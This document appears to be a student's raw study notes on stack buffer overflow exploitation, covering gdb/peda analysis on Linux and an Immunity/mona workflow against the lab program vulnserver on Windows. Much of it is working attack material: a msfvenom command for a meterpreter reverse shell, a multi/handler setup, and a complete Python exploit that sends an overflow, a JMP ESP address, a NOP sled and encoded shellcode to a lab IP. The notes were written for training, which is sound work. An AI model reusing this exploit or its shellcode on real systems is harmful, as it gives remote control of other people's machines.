BUFFER OVERFLOW COMMON TERMS

Heap- Memory that can be allocated and deallocated
Stack -A contiguous section of memory used for passing arguments
Registers -Storage elements as close as possible to the central processing unit (CPU)
Instruction Pointer (IP) -a.k.a Program Counter (PC), contains the address of next instruction to be executed
Stack Pointer (SP) -Contains the address of the next available space on the stack
Base Pointer (BP) -The base of the stack
Function -Code that is separate from the main program that is often used to replace code the repeats in order to make the program smaller and more efficient
Shellcode -The code that is executed once an exploit successfully takes advantage of a vulnerability

NOP SLED - a NOP sled (or "no-operation" sled") is a sequence of "no-operation" (NOP) machine instructions.

                                                                                                                                                                                    TM ON WINDOWS MONA, IMMUNITY
GDB USES
* installations of peda plugin
  git clone https://github.com/longld/peda.git ~/peda
  echo "source ~/peda/peda.py" >> ~/.gdbinit

DEMO on func.exe
strings func1 | head 
file func  -to see the file type.
DYNAMIC ANALYSIS  RUN in lINUX OPS STATION.
  ./func $(echo "12345678") #pass argument
  ./func <<<$(echo "12345678") #the gators are simulating  user input

## DISASSEMBLY
gdb ./func command
shell - bring you back to your shell or working directory.
exit - bring you back to gdb from shell
quit - break you out of gdb

IN GDB                                ##DON'T HIDE ANYTHING IN X86
  info functions
  run - to run the program 
  disass or pdisass main #pdisass only work if you have peta
      disass main
  pdisass getuserinput #getuserinput is a function    #open source research on red. do open source research oom it.
run <<<$(echo "AAA")
run <<<$(python linbuff.py)
google wiremask  https://wiremask.eu/tools/buffer-overflow-pattern-generator/
copy paste paterrn - paste it in a new offset in your code with quotes. 
run it in gdb now you looking for EIP, copy eip in the offset on the website, you should get a number.

PYTHON  SCRIPT
#!/usr/bin/env python
offset = "A" * 100    adjust the the ofset to 62   #triple single quotes help write paragraph. create multi-line strings.
print(offset)
eip = "BBBB"
offset = " paste from wiremask offset"                  TROUBLESHOOT ##RUN FILE AND THE EXECUTABLE 
print(offset+eip)
eip = "\x59\x3b\xde\xf7" switch this with the "BBBB"
nop = "\x90" * 15



#####setup GDB environment and find jmp esp addresses

#follow the exaact orer below 
>SHELl    this is done for every machine you are on.
env - gdb ./func                                                                                    scp -r /home/student/Downloads/* student@10.50.153.200:C:/Users/student/ 
#Show env 
#unset env COLUMNS
#unset env LINES 
#run and ctrl+c or start
info proc map

### grab first address after heap, last address before 
0xf7de1000 0xf7ffe000   first address after heap and last address before stack
#find  /b 0xf7de1000, 0xf7ffe000, 0xff, 0xe4 
0xf7de3b59 > \x59\x3b\xde\xf7 (little indian)
0xf7f588ab
0xf7f645fb
0xf7f6460f
0xf7f64aeb
#put the little indian in the python code eip section.

#SHELL
######msfvenom - p linux/x86/exec CMD="whoami" -b "\x00\xfe\x20\x0a\xff" -f python  
 buf =  b""
buf += b"\xbb\x7e\x25\x4c\xd7\xdb\xca\xd9\x74\x24\xf4\x5a"
buf += b"\x2b\xc9\xb1\x0b\x31\x5a\x14\x03\x5a\x14\x83\xea"
buf += b"\xfc\x9c\xd0\x26\xdc\x38\x82\xe5\x84\xd0\x99\x6a"
buf += b"\xc0\xc7\x8a\x43\xa1\x6f\x4b\xf4\x6a\x0d\x22\x6a"
buf += b"\xfc\x32\xe6\x9a\xf9\xb4\x07\x5b\x71\xdc\x68\x3a"
buf += b"\x10\x75\x77\xeb\xb9\x0c\x96\xde\xbe"


##### WINDOWS BUFFER OVERFLOW 

#Static
strings .\vulnserver.exe | select -first 10

##Behavioral
get-process | findstr /i vuln 
netstat -anop tcp | findstr /i 8148  

##run as intended

#Dyamic 
Run Immunity as Administrator > open .exe > play, rewind, repeat
fuzzing > wireshark > find offset

!mona modules #Find unprotected DLLS
!mona jmp -r esp -m "essfunc.dll"   #Search for JMP ESP with unprotected DLL
#Window > Log Data 
625011AF    \xAF\x11\x50\x62 
625011BB
625011C7

#MSF CONSOLE
msfconsole

use multi/handler
show options 
set payload windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0 
set LPORT 4444
exploit

#Shell Code
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.50.153.198 lport=44444 -b "\x00\xfe\x20\x0a\xff" -f python


WINDOWS PYTHON SCRIPT
!/usr/bin/python
import socket

### FUZZ ###
buf = "TRUN /.:/"
buf += "A" * 2003 # offset
#buf += "BBBB" # EIP                      #line commented out 
buf += "\xAF\x11\x50\x62" # EIP
buf += "\x90" * 10 # NOP
buf += b"\xda\xc7\xd9\x74\x24\xf4\x5f\xb8\x94\x42\x15\x86"
buf += b"\x29\xc9\xb1\x59\x31\x47\x19\x83\xef\xfc\x03\x47"
buf += b"\x15\x76\xb7\xe9\x6e\xf9\x38\x12\x6f\x65\x08\xc0"
buf += b"\xe6\x80\x0e\x6f\xaa\x7a\x44\x3d\x47\xf1\x08\xd6"
buf += b"\x66\xfa\x26\xa4\xa0\x0b\x8e\x03\x97\x22\x30\x3f"
buf += b"\xeb\x25\xcc\x42\x38\x85\xed\x8c\x4d\xc4\x2a\x5b"
buf += b"\x3b\x29\xe6\xd7\x91\xa5\x8c\xaa\x29\xc4\x42\xa1"
buf += b"\x12\xbe\x35\x33\x52\x4a\xf6\x3a\x83\x39\x5e\x1d"
buf += b"\xa8\x75\x47\x5c\x7d\xd5\xf2\x97\xf5\xe9\xcd\xd8"
buf += b"\xbf\x9a\x1a\xac\x41\x4a\x53\x72\xed\xb3\x5b\x7f"
buf += b"\xef\xf4\x5c\x60\x9a\x0e\x9f\x1d\x9d\xd5\xdd\xf9"
buf += b"\x28\xc9\x46\x89\x8b\x2d\x76\x5e\x4d\xa6\x74\x2b"
buf += b"\x19\xe0\x98\xaa\xce\x9b\xa5\x27\xf1\x4b\x2c\x73"
buf += b"\xd6\x4f\x74\x27\x77\xd6\xd0\x86\x88\x08\xbc\x77"
buf += b"\x2d\x43\x2f\x61\x51\xac\xaf\x8e\x0f\x3a\x63\x43"
buf += b"\xb0\xba\xeb\xd4\xc3\x88\xb4\x4e\x4c\xa0\x3d\x49"
buf += b"\x8b\xb1\x2a\x6a\x43\x79\x3a\x94\x64\x79\x12\x53"
buf += b"\x30\x29\x0c\x72\x39\xa2\xcc\x7b\xec\x5e\xc7\xeb"
buf += b"\x05\xac\x4e\x2d\x71\xd2\x70\x1f\x1e\x5b\x96\x0f"
buf += b"\x4f\x0b\x07\xf0\x3f\xeb\xf7\x98\x55\xe4\x28\xb8"
buf += b"\x55\x2f\x41\x53\xba\x99\x39\xcc\x23\x80\xb2\x6d"
buf += b"\xab\x1f\xbf\xae\x27\x95\x3f\x60\xc0\xdc\x53\x95"
buf += b"\xb7\x1e\xac\x66\x52\x1e\xc6\x62\xf4\x49\x7e\x69"
buf += b"\x21\xbd\x21\x92\x04\xbe\x26\x6c\xd9\xf6\x5d\x5b"
buf += b"\x4f\xb6\x09\xa4\x9f\x36\xca\xf2\xf5\x36\xa2\xa2"
buf += b"\xad\x65\xd7\xac\x7b\x1a\x44\x39\x84\x4a\x38\xea"
buf += b"\xec\x70\x67\xdc\xb2\x8b\x42\x5e\xb4\x73\x10\x49"
buf += b"\x1d\x1b\xea\xc9\x9d\xdb\x80\xc9\xcd\xb3\x5f\xe5"
buf += b"\xe2\x73\x9f\x2c\xab\x1b\x2a\xa1\x19\xba\x2b\xe8"
buf += b"\xfc\x62\x2b\x1f\x25\x95\x56\x50\xda\x56\xa7\x78"
buf += b"\xbf\x57\xa7\x84\xc1\x64\x71\xbd\xb7\xab\x41\xfa"
buf += b"\xc8\x9e\xe4\xab\x42\xe0\xbb\xac\x46"

### SHELLCODE ###

s = socket.socket (socket.AF_INET, socket.SOCK_STREAM) #create the Ipv4 socket, TCP protocol
s.connect(("10.50.153.200", 9999)) #connect to target IP and port
print s.recv(1024) #print response
s.send(buf) #send the value of buf

                                                                   




























